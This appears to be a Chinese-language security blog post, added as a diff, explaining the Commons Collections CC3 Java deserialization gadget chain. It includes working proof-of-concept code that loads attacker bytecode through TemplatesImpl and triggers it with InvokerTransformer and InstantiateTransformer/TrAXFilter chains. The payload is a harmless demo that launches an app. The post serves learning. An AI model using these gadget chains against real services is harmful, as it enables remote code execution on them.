@@ -1,0 +1,354 @@
+---
+layout: post
+title: CC链-CC3
+subtitle: Let's start learning!
+tags: [CC链]
+author: Sine
+---
+
+# CC3
+
+TemplatesImpl.newTransformer()->TemplatesImpl.getTransletInstance()->TemplatesImpl.defineTransletClasses()->ClassLoader.defineClass()->newInstance()
+
+前两条链子都利用Invoketranformer来执行命令，当Invoketranformer类被限制进入黑名单，就无法再利用
+
+故而我们来看CC3，CC3通过任意类动态加载来进行代码执行
+
+在defineClass中，将java字节码加载为java对象，再通过newInstance进行初始化，初始化时会加载类的静态代码块
+
+![BDD63378-1752-4E23-982E-B4FE6069AB8D](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218162539338.png)
+
+ClassLoader的defineClass方法为protected方法，所以用反射去调用他，可以看到，成功将字节码加载为java对象，并在初始化时加载静态代码块
+
+![image-20250218162410581](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218162410634.png)
+
+Test1的内容
+
+![image-20250218162736998](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218162737091.png)
+
+要找一个可以调用到defineClass的public方法，查找defineClass的用法发现TemplatesImpl的内部类TransletClassLoader继承了ClassLoader，并重写了defineClass方法
+
+![image-20250218163940447](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218163940645.png)
+
+这个defineClass方法是一个defualt方法，可以在包内部被调用，寻找哪里调用了他，发现TemplatesImpl的defineTransletClasses方法，但他是一个private方法，所以需要再往上找
+
+![image-20250218164229424](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218164229469.png)
+
+TemplatesImpl的getTransletInstance方法调用了defineTransletClasses，但getTransletInstance也是private方法，不能被外部直接调用，再往上找
+
+![image-20250218164324961](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218164325004.png)
+
+TemplatesImpl的newTransformer方法满足条件
+
+![image-20250218164449218](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218164449310.png)
+
+ 调用连如下TemplatesImpl.newTransformer()->getTransletInstance()->defineTransletClasses()->defineClass()->newInstance()（在getTransletInstance中，调用完defineTransletClasses，会对defineClass加载的java对象进行初始化newInstance)
+
+![image-20250213145246694](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213145246752.png)
+
+new一个TemplatesImpl，去调用他的newTransformer()，我们要走进getTransletInstance，所以这里没有需要我们赋值的变量
+
+![image-20250213134014607](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213134014667.png)
+
+需要给`_name`赋值，但是走进defineTransletClasses中，所以`_class`无需赋值
+
+![image-20250213134212474](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213134212549.png)
+
+`_bytecodes`为null时会抛出异常，且`_tfactory`会调用自身的方法，所以需要对他赋值
+
+![image-20250213134359286](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213134359335.png)
+
+transient关键字表示该对象不参与序列化，故`_tfactory`应该是在readObject里进行赋值的
+
+![image-20250213135220177](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213135220221.png)
+
+发现_tfactory = new TransformerFactoryImpl();
+
+![image-20250213140444891](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213140444929.png)
+
+```java
+package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.File;
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+
+public class CC3Test {
+
+    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException {
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates,"123");
+        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
+      //_bytecodes为byte[][] 格式
+        bytecodesField.setAccessible(true);
+        byte [] code = Files.readAllBytes(Paths.get("/Users/sine/Desktop/code/Java/untitled1/target/classes/org/example/Test.class"));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+        Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
+        _tfactoryField.setAccessible(true);
+        _tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        templates.newTransformer();
+    }
+
+}
+```
+
+```java
+package org.example;
+
+import java.io.IOException;
+
+public class Test{
+    static {
+        try {
+            Runtime.getRuntime().exec("open /Applications/NeteaseMusic.app");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+}
+```
+
+然后发现在422行报错，抛出_auxClasses空指针异常
+
+![image-20250213143204318](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213143204361.png)
+
+因为我们要让_transletIndex大于等于0，所以要让superClass.getName().equals(ABSTRACT_TRANSLET)为true
+
+![image-20250213143422862](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213143422912.png)
+
+所以我们的自己的要执行代码的恶意Test类需要继承"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"
+
+或者直接给_auxClasses赋值，并将_transletIndex的值修改为0
+
+成功弹出app
+
+```java
+				TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates,"123");
+        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
+        bytecodesField.setAccessible(true);
+        byte [] code = Files.readAllBytes(Paths.get("/Users/sine/Desktop/code/Java/untitled1/target/classes/org/example/Test.class"));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+        Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
+        _tfactoryField.setAccessible(true);
+        _tfactoryField.set(templates,new TransformerFactoryImpl());
+//        Field transletIndexField = templatesClass.getDeclaredField("_transletIndex");
+//        transletIndexField.setAccessible(true);
+//        transletIndexField.set(templates,0);
+//        Field auxClassesField = templatesClass.getDeclaredField("_auxClasses");
+//        auxClassesField.setAccessible(true);
+//        Map<String, Class<?>> auxClasses = new HashMap<>();
+//        auxClasses.put("java.lang.Object", Object.class);
+//        auxClassesField.set(templates,auxClasses);
+        templates.newTransformer();
+```
+
+Test继承AbstractTranslet类
+
+![image-20250218170432853](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218170433004.png)
+
+成功弹出
+
+![image-20250218170352066](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218170352207.png)
+
+接着要让他在反序列化过程中被触发，可以直接套用CC1的部分流程
+
+```java
+package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3Test {
+
+    public static void main(String[] args) throws Exception {
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates,"123");
+        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
+        bytecodesField.setAccessible(true);
+        byte [] code = Files.readAllBytes(Paths.get("/Users/sine/Desktop/code/Java/untitled1/target/classes/org/example/Test.class"));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+        Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
+        _tfactoryField.setAccessible(true);
+        _tfactoryField.set(templates,new TransformerFactoryImpl());
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(templates),
+                new InvokerTransformer("newTransformer", null, null)
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap<Object, Object> map = new HashMap<>();
+        Map<Object, Object> decorate = LazyMap.decorate(map, chainedTransformer);
+        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+
+        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, decorate);
+        Map newMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);
+        Object o = constructor.newInstance(Target.class, newMap);
+        serialize(o);
+        unserialize("ser.bin");
+
+    }
+
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+
+
+}
+```
+
+![image-20250218170957272](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218170957420.png)
+
+把我们处理好的templates传入Transformer[]的ConstantTransformer中，传入Transformer[]的第二个参数new InvokerTransformer("newTransformer", null, null)，ConstantTransformer.transform(xxx)（传什么都返回templates）->InvokerTransformer.transform(templates)->templates.newTransformer()    
+
+通过CC1的第二条链部分触发
+
+![image-20250213154419259](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213154419292.png)
+
+TrAXFilter构造方法会直接调用newTransformer()，未继承序列化方法不可序列化反序列化
+
+![image-20250213161310228](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213161310301.png)
+
+InstantiateTransformer的transform方法
+
+![image-20250213161714086](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213161714134.png)
+
+调用InstantiateTransformer的transform方法，传入的input为TrAXFilter.class，iParamTypes为Class[]{Templates.class}，iArgs为Object[]{templates}，会调用TrAXFilter的构造方法，->_transformer = (TransformerImpl) templates.newTransformer();
+
+iParamTypes和iArgs的赋值在InstantiateTransformer的初始化方法中方法
+
+![image-20250213162348265](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213162348325.png)
+
+要调用InstantiateTransformer的transform方法，仍然可以嵌套CC1
+
+```java
+package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3Test {
+
+    public static void main(String[] args) throws Exception {
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates,"123");
+        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
+        bytecodesField.setAccessible(true);
+        byte [] code = Files.readAllBytes(Paths.get("/Users/sine/Desktop/code/Java/untitled1/target/classes/org/example/Test.class"));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+        Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
+        _tfactoryField.setAccessible(true);
+        _tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap<Object, Object> map = new HashMap<>();
+        Map<Object, Object> decorate = LazyMap.decorate(map, chainedTransformer);
+        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+
+        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, decorate);
+        Map newMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);
+        Object o = constructor.newInstance(Target.class, newMap);
+        serialize(o);
+        unserialize("ser.bin");
+
+    }
+
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+
+
+}
+```
+
+![image-20250218170913582](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218170913626.png)
+
